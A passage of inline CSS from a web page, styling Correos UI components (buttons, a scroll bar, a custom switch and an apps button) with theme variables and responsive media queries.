		[theme=default][variant=link-center].sc-correos-ui-button-h,
		[theme=default][variant=link-auto-height].sc-correos-ui-button-h,
		[theme=default][variant=link-auto-height-left].sc-correos-ui-button-h,
		[theme=default][variant=link-notification].sc-correos-ui-button-h,
		[theme=default][variant=link-notification-error].sc-correos-ui-button-h,
		[theme=default][variant=header-private].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-link-default-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-link-default-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-link-default-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-link-default-text-color);
			--_ui-button-text-color-hover: var(--ui-button-link-default-text-color-hover);
			--_ui-button-border: var(--ui-button-link-default-border);
			--_ui-button-min-width: var(--ui-button-link-default-min-width)
		}

		[theme=primary][variant=link].sc-correos-ui-button-h,
		[theme=primary][variant=link-center].sc-correos-ui-button-h,
		[theme=primary][variant=link-auto-height].sc-correos-ui-button-h,
		[theme=primary][variant=link-auto-height-left].sc-correos-ui-button-h,
		[theme=primary][variant=link-notification].sc-correos-ui-button-h,
		[theme=primary][variant=link-notification-error].sc-correos-ui-button-h,
		[theme=primary][variant=header-private].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-link-primary-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-link-primary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-link-primary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-link-primary-text-color);
			--_ui-button-text-color-hover: var(--ui-button-link-primary-text-color-hover);
			--_ui-button-border: var(--ui-button-link-primary-border);
			--_ui-button-min-width: var(--ui-button-link-primary-min-width)
		}

		[theme=secondary][variant=link].sc-correos-ui-button-h,
		[theme=secondary][variant=link-center].sc-correos-ui-button-h,
		[theme=secondary][variant=link-auto-height].sc-correos-ui-button-h,
		[theme=secondary][variant=link-auto-height-left].sc-correos-ui-button-h,
		[theme=secondary][variant=link-notification].sc-correos-ui-button-h,
		[theme=secondary][variant=link-notification-error].sc-correos-ui-button-h,
		[theme=secondary][variant=header-private].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-link-secondary-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-link-secondary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-link-secondary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-link-secondary-text-color);
			--_ui-button-text-color-hover: var(--ui-button-link-secondary-text-color-hover);
			--_ui-button-border: var(--ui-button-link-secondary-border);
			--_ui-button-min-width: var(--ui-button-link-secondary-min-width)
		}

		[theme=secondary][variant=link-underline].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-ghost-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-link-secondary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-link-secondary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-link-secondary-text-color);
			--_ui-button-text-color-hover: var(--ui-button-link-secondary-text-color-hover);
			--_ui-button-border: var(--ui-button-link-secondary-border);
			--_ui-button-min-width: var(--ui-button-link-secondary-min-width)
		}

		.sc-correos-ui-button-h {
			display: block
		}

		@media (max-width: 639px) {
			[full-width=true].sc-correos-ui-button-h {
				width: 100%;
				margin-right: 0 !important
			}
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			height: 3.5rem;
			min-width: 7rem;
			border: var(--_ui-button-border);
			text-transform: none;
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: bold;
			border-radius: var(--_ui-button-border-radius);
			padding: 0 1.5rem 0 1.5rem
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: 8rem
			}
		}

		@media (max-width: 639px) {
			.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				height: 3rem
			}
		}

		@media (min-width: 640px) {
			.sc-correos-ui-button-h .mdc-button.equal-size.sc-correos-ui-button {
				height: 3rem
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-button-h .mdc-button.equal-size.sc-correos-ui-button {
				height: 3.5rem
			}
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:not(:disabled) {
			border-color: var(--_ui-button-border-color)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
			border-radius: var(--_ui-button-border-radius)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:not(:disabled) {
			background-color: var(--_ui-button-bg-color)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
			background: var(--_ui-button-bg-color-hover)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:disabled {
			background-color: var(--_ui-button-bg-color-disabled);
			border: solid 1px var(--_ui-button-border-color-disabled)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:not(:disabled) {
			color: var(--_ui-button-text-color)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after,
		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before {
			background-color: var(--_ui-button-text-color)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button {
			letter-spacing: 0;
			font-family: var(--theme-fontFamily-main)
		}

		.sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:focus {
			outline: none
		}

		.sc-correos-ui-button-h .mdc-button.focus-visible.sc-correos-ui-button {
			outline: 2px solid black
		}

		.sc-correos-ui-button-h .full-width.sc-correos-ui-button {
			width: 100%
		}

		.sc-correos-ui-button-h .uppercase.sc-correos-ui-button {
			text-transform: uppercase
		}

		.sc-correos-ui-button-h .uppercase.sc-correos-ui-button {
			text-transform: uppercase
		}

		.sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button:nth-child(2) {
			display: none
		}

		.sc-correos-ui-button-h .sc-correos-ui-button-s>[slot=icon-left] {
			margin-right: 1rem;
			-ms-flex-pack: end;
			justify-content: flex-end
		}

		.sc-correos-ui-button-h .sc-correos-ui-button-s>[slot=icon-right] {
			margin-left: 1rem
		}

		[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
		[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			font-weight: bold;
			padding: 0 0 0 0;
			min-width: auto
		}

		@media (min-width: 1024px) {

			[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}
		}

		[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
		[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
			color: var(--_ui-button-text-color-hover)
		}

		[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover .mdc-button__label.sc-correos-ui-button,
		[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover .mdc-button__label.sc-correos-ui-button {
			text-decoration: underline
		}

		[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:disabled,
		[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:disabled {
			border: none
		}

		[variant=link].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
		[variant=link-center].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
			text-align: initial
		}

		[variant=link].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
		[variant=link-center].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button {
			opacity: 0
		}

		[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: center;
			justify-content: center;
			padding: 0 0 0 0;
			background-color: inherit;
			min-width: auto
		}

		@media (max-width: 639px) {
			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				max-height: 34px
			}
		}

		@media (min-width: 640px) {
			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				max-height: 40px
			}
		}

		@media (min-width: 1024px) {
			[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				max-height: 40px
			}
		}

		[variant=link-like-banner].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
			background-color: inherit;
			color: var(--_ui-button-text-color-hover)
		}

		[variant=link-like-banner].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
			text-align: initial
		}

		[variant=link-like-banner].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button {
			opacity: 0
		}

		[variant=link].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			-ms-flex-pack: start;
			justify-content: flex-start
		}

		[variant=link-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			-ms-flex-pack: center;
			justify-content: center
		}

		[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
		[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
		[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
		[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			font-weight: bold;
			padding: 0 0 0 0;
			height: auto;
			width: 100%
		}

		@media (min-width: 1024px) {

			[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button,
			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				width: 100%
			}
		}

		[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
		[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
		[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover,
		[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button:hover {
			color: var(--_ui-button-text-color-hover)
		}

		[variant=link-auto-height].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
		[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
		[variant=link-notification].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button,
		[variant=link-notification-error].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
			text-align: initial
		}

		[variant=link-auto-height].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
		[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
		[variant=link-notification].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button,
		[variant=link-notification-error].sc-correos-ui-button-h .mdc-button__ripple.sc-correos-ui-button {
			opacity: 0
		}

		[variant=link-auto-height].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			-ms-flex-pack: start;
			justify-content: flex-start
		}

		[variant=link-auto-height-left].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			-ms-flex-pack: end;
			justify-content: flex-end
		}

		[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			-ms-flex-pack: start;
			justify-content: flex-start;
			margin-left: 24px
		}

		@media (min-width: 1024px) {
			[variant=link-notification].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				margin-left: 40px
			}
		}

		[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			margin-left: 8px
		}

		@media (min-width: 1024px) {
			[variant=link-notification-error].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				margin-left: 16px
			}
		}

		[variant=tiny].sc-correos-ui-button-h {
			width: auto
		}

		[variant=tiny].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			padding: 0 1rem 0 1rem;
			min-width: auto
		}

		@media (min-width: 1024px) {
			[variant=tiny].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}
		}

		.sc-correos-ui-button-h[variant=tiny] .sc-correos-ui-button-s>[slot=icon-left] {
			margin-right: 0
		}

		[variant=tiny].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
			display: none
		}

		[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			min-width: auto
		}

		@media (min-width: 1024px) {
			[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}
		}

		[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
			display: none
		}

		.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-left],
		.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-right] {
			margin-right: 0
		}

		@media (min-width: 1024px) {
			[variant=no-icons-desktop].sc-correos-ui-button-h .mdc-button__label.sc-correos-ui-button {
				display: block
			}

			.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-left],
			.sc-correos-ui-button-h[variant=no-icons-desktop] .sc-correos-ui-button-s>[slot=icon-right] {
				display: none
			}
		}

		[variant=no-icons].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			min-width: auto
		}

		@media (min-width: 1024px) {
			[variant=no-icons].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}
		}

		.sc-correos-ui-button-h[variant=no-icons] .sc-correos-ui-button-s>[slot=icon-left] {
			display: none
		}

		[variant=link-underline].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			min-width: auto
		}

		@media (min-width: 1024px) {
			[variant=link-underline].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
				min-width: auto
			}
		}

		.sc-correos-ui-button-h[variant=link-underline] .sc-correos-ui-button-s>[slot=text] {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 1rem;
			line-height: 1.5rem;
			text-decoration: underline;
			margin-bottom: 18px
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-button-h[variant=link-underline] .sc-correos-ui-button-s>[slot=text] {
				font-size: 1.125rem;
				line-height: 1.875rem
			}
		}

		[variant=button-center].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			font-weight: bold;
			-ms-flex-pack: center;
			justify-content: center;
			background: transparent;
			color: var(--_ui-button-color)
		}

		[iscontained=within-text].sc-correos-ui-button-h {
			display: initial
		}

		[iscontained=within-text].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button {
			display: -ms-inline-flexbox;
			display: inline-flex
		}

		[iscontained=within-text].sc-correos-ui-button-h .mdc-button.sc-correos-ui-button {
			height: auto;
			min-width: auto
		}

		[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button {
			width: 100%
		}

		[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button.sc-correos-ui-button {
			font-weight: bold;
			padding: 0 0 0 0;
			-ms-flex-pack: start;
			justify-content: flex-start;
			height: auto;
			width: 100%;
			padding: 24px
		}

		@media (min-width: 1024px) {
			[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button.sc-correos-ui-button {
				width: 100%
			}
		}

		[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button.sc-correos-ui-button:hover {
			color: var(--_ui-button-text-color-hover)
		}

		[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button {
			text-align: initial
		}

		[variant=header-private].sc-correos-ui-button-h .mdc-touch-target-wrapper.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
			opacity: 0
		}

		.sc-correos-ui-button-h[variant=header-private] .sc-correos-ui-button-s>[slot=icon-left] {
			margin-right: 0.5rem
		}
	</style>
	<style>
		.sc-correos-ui-scroll-bar-h {
			display: block;
			position: relative;
			height: 100%;
			padding: 0;
			overflow-anchor: none;
			-ms-overflow-style: none;
			touch-action: auto;
			-ms-touch-action: auto
		}
	</style>
	<style>
		.sc-correos-ui-custom-switch-h {
			--_ui-custom-switch-border-color: var(--ui-custom-switch-border-color, green);
			--_ui-custom-switch-bg-color: var(--ui-custom-switch-bg-color, magenta);
			--_ui-custom-switch-bg-color-icon: var(--ui-custom-switch-bg-color-icon, yellow);
			--_ui-custom-switch-color-icon: var(--ui-custom-switch-color-icon, black);
			--_ui-custom-switch-color-text: var(--ui-custom-switch-color-text, blue)
		}

		[theme=primary].sc-correos-ui-custom-switch-h {
			--_ui-custom-switch-border-color-checked: var(--ui-custom-switch-primary-border-color-checked, magenta);
			--_ui-custom-switch-bg-color-checked: var(--ui-custom-switch-primary-bg-color-checked, red);
			--_ui-custom-switch-color-checked-icon: var(--ui-custom-switch-primary-color-checked-icon, green);
			--_ui-custom-switch-bg-color-checked-icon: var(--ui-custom-switch-primary-bg-color-checked-icon, yellow)
		}

		[theme=secondary].sc-correos-ui-custom-switch-h {
			--_ui-custom-switch-border-color-checked: var(--ui-custom-switch-secondary-border-color-checked, magenta);
			--_ui-custom-switch-bg-color-checked: var(--ui-custom-switch-secondary-bg-color-checked, red);
			--_ui-custom-switch-color-checked-icon: var(--ui-custom-switch-secondary-color-checked-icon, green);
			--_ui-custom-switch-bg-color-checked-icon: var(--ui-custom-switch-secondary-bg-color-checked-icon, yellow)
		}

		[theme=blocked].sc-correos-ui-custom-switch-h {
			--_ui-custom-switch-border-color-blocked: var(--ui-custom-switch-border-color-blocked, magenta);
			--_ui-custom-switch-bg-color-blocked: var(--ui-custom-switch-bg-color-blocked, red);
			--_ui-custom-switch-color-blocked-icon: var(--ui-custom-switch-color-blocked-icon, green);
			--_ui-custom-switch-bg-color-blocked-icon: var(--ui-custom-switch-bg-color-blocked-icon, yellow)
		}

		.sc-correos-ui-custom-switch-h {
			display: -ms-flexbox;
			display: flex;
			margin-top: 8px;
			-ms-flex-align: center;
			align-items: center;
			width: 100%
		}

		@media (min-width: 640px) {
			.sc-correos-ui-custom-switch-h {
				-ms-flex-pack: justify;
				justify-content: space-between
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-custom-switch-h {
				-ms-flex-pack: justify;
				justify-content: space-between
			}
		}

		.sc-correos-ui-custom-switch-h .cdk-container.sc-correos-ui-custom-switch {
			position: relative;
			display: inline-block;
			width: 48px;
			height: 24px
		}

		.sc-correos-ui-custom-switch-h .cdk-container__slider.sc-correos-ui-custom-switch {
			position: absolute;
			cursor: pointer;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			-webkit-transition: 0.4s;
			transition: 0.4s;
			border: 1px solid var(--_ui-custom-switch-border-color);
			border-radius: 16px;
			background-color: var(--_ui-custom-switch-bg-color)
		}

		.sc-correos-ui-custom-switch-h .cdk-container__slider.sc-correos-ui-custom-switch .cdk-icon.sc-correos-ui-custom-switch {
			position: absolute;
			height: 16px;
			width: 16px;
			font-size: 20px;
			left: 3px;
			top: 3px;
			-webkit-transition: 0.4s;
			transition: 0.4s;
			border-radius: 50%;
			background-color: var(--_ui-custom-switch-bg-color-icon);
			color: var(--_ui-custom-switch-color-icon)
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.focus.sc-correos-ui-custom-switch {
			position: relative
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.focus.sc-correos-ui-custom-switch:after {
			content: "";
			position: absolute;
			border: 2px solid black;
			width: 50px;
			height: 27px;
			top: -7px;
			left: -7px
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.sc-correos-ui-custom-switch:checked+.cdk-container__slider.sc-correos-ui-custom-switch {
			border: 1px solid var(--_ui-custom-switch-border-color-checked);
			background-color: var(--_ui-custom-switch-bg-color-checked)
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.sc-correos-ui-custom-switch:checked+.cdk-container__slider.sc-correos-ui-custom-switch .cdk-icon.sc-correos-ui-custom-switch {
			background-color: var(--_ui-custom-switch-bg-color-checked-icon);
			color: var(--_ui-custom-switch-color-checked-icon)
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.sc-correos-ui-custom-switch:checked+.cdk-container__slider.sc-correos-ui-custom-switch .cdk-icon.sc-correos-ui-custom-switch {
			-webkit-transform: translateX(24px);
			-ms-transform: translateX(24px);
			transform: translateX(24px)
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.sc-correos-ui-custom-switch:disabled+.cdk-container__slider.sc-correos-ui-custom-switch {
			cursor: default;
			border: 1px solid var(--_ui-custom-switch-border-color-blocked);
			border-radius: 16px;
			background-color: var(--_ui-custom-switch-bg-color-blocked)
		}

		.sc-correos-ui-custom-switch-h .cdk-container__input.sc-correos-ui-custom-switch:disabled+.cdk-container__slider.sc-correos-ui-custom-switch .cdk-icon.sc-correos-ui-custom-switch {
			color: var(--_ui-custom-switch-color-blocked-icon);
			background-color: var(--_ui-custom-switch-bg-color-blocked-icon);
			-webkit-transform: translateX(12px);
			-ms-transform: translateX(12px);
			transform: translateX(12px)
		}

		.sc-correos-ui-custom-switch-h .cdk-text.sc-correos-ui-custom-switch {
			font-size: 100%;
			margin: 0;
			padding: 0;
			font-weight: normal;
			font-size: 0.875rem;
			line-height: 1.375rem;
			font-weight: 300;
			margin-left: 16px;
			color: var(--_ui-custom-switch-color-text)
		}

		@media (min-width: 1024px) {
			.sc-correos-ui-custom-switch-h .cdk-text.sc-correos-ui-custom-switch {
				font-size: 1rem;
				line-height: 1.5rem
			}
		}
	</style>
	<style>
		.sc-correos-ui-button-apps-h {
			--_ui-button-apps-background-color: var(--ui-button-apps-background-color, white);
			--_ui-button-bg-color: var(--ui-button-secondary-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-secondary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-secondary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-secondary-text-color);
			--_ui-button-border-color: var(--ui-button-secondary-border-color);
			--_ui-button-border: var(--ui-button-secondary-border);
			--_ui-button-border-color-disabled: var(--ui-button-secondary-border-color-disabled);
			--_ui-button-border-radius: var(--ui-button-border-radius, 8px);
			--_ui-button-min-width: var(--ui-button-min-width, 12rem)
		}

		.mdc-touch-target-wrapper.sc-correos-ui-button-apps {
			display: inline
		}

		.mdc-button.sc-correos-ui-button-apps {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 0.875rem;
			line-height: 2.25rem;
			font-weight: 500;
			letter-spacing: 0.0892857143em;
			text-decoration: none;
			text-transform: uppercase;
			padding: 0 8px 0 8px;
			display: -ms-inline-flexbox;
			display: inline-flex;
			position: relative;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: center;
			justify-content: center;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			min-width: 64px;
			border: none;
			outline: none;
			line-height: inherit;
			-webkit-user-select: none;
			-moz-user-select: none;
			-ms-user-select: none;
			user-select: none;
			-webkit-appearance: none;
			overflow: visible;
			vertical-align: middle;
			border-radius: 4px
		}

		.mdc-button.sc-correos-ui-button-apps::-moz-focus-inner {
			padding: 0;
			border: 0
		}

		.mdc-button.sc-correos-ui-button-apps:active {
			outline: none
		}

		.mdc-button.sc-correos-ui-button-apps:hover {
			cursor: pointer
		}

		.mdc-button.sc-correos-ui-button-apps:disabled {
			background-color: transparent;
			color: rgba(0, 0, 0, 0.37);
			cursor: default;
			pointer-events: none
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__ripple.sc-correos-ui-button-apps {
			border-radius: 4px
		}

		.mdc-button.sc-correos-ui-button-apps:not(:disabled) {
			background-color: transparent
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps {
			margin-left: 0;
			margin-right: 8px;
			display: inline-block;
			width: 18px;
			height: 18px;
			font-size: 18px;
			vertical-align: top
		}

		[dir=rtl].sc-correos-ui-button-apps .mdc-button.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
			margin-left: 8px;
			margin-right: 0
		}

		.mdc-button.sc-correos-ui-button-apps .mdc-button__touch.sc-correos-ui-button-apps {
			position: absolute;
			top: 50%;
			right: 0;
			left: 0;
			height: 48px;
			-webkit-transform: translateY(-50%);
			transform: translateY(-50%)
		}

		.mdc-button.sc-correos-ui-button-apps:not(:disabled) {
			color: #6200ee;
			color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps {
			margin-left: 8px;
			margin-right: 0
		}

		[dir=rtl].sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
			margin-left: 0;
			margin-right: 8px
		}

		svg.mdc-button__icon.sc-correos-ui-button-apps {
			fill: currentColor
		}

		.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps {
			margin-left: -4px;
			margin-right: 8px
		}

		[dir=rtl].sc-correos-ui-button-apps .mdc-button--raised.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
		[dir=rtl].sc-correos-ui-button-apps .mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
		[dir=rtl].sc-correos-ui-button-apps .mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
			margin-left: 8px;
			margin-right: -4px
		}

		.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps {
			margin-left: 8px;
			margin-right: -4px
		}

		[dir=rtl].sc-correos-ui-button-apps .mdc-button--raised.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--raised.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
		[dir=rtl].sc-correos-ui-button-apps .mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--unelevated.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps,
		[dir=rtl].sc-correos-ui-button-apps .mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon.sc-correos-ui-button-apps,
		.mdc-button--outlined.sc-correos-ui-button-apps .mdc-button__label.sc-correos-ui-button-apps+.mdc-button__icon[dir=rtl].sc-correos-ui-button-apps {
			margin-left: -4px;
			margin-right: 8px
		}

		.mdc-button--raised.sc-correos-ui-button-apps,
		.mdc-button--unelevated.sc-correos-ui-button-apps {
			padding: 0 16px 0 16px
		}

		.mdc-button--raised.sc-correos-ui-button-apps:disabled,
		.mdc-button--unelevated.sc-correos-ui-button-apps:disabled {
			background-color: rgba(0, 0, 0, 0.12);
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-button--raised.sc-correos-ui-button-apps:not(:disabled),
		.mdc-button--unelevated.sc-correos-ui-button-apps:not(:disabled) {
			background-color: #6200ee
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button--raised.sc-correos-ui-button-apps:not(:disabled),
			.mdc-button--unelevated.sc-correos-ui-button-apps:not(:disabled) {
				background-color: var(--mdc-theme-primary, #6200ee)
			}
		}

		.mdc-button--raised.sc-correos-ui-button-apps:not(:disabled),
		.mdc-button--unelevated.sc-correos-ui-button-apps:not(:disabled) {
			color: #fff;
			color: var(--mdc-theme-on-primary, #fff)
		}

		.mdc-button--raised.sc-correos-ui-button-apps {
			-webkit-box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
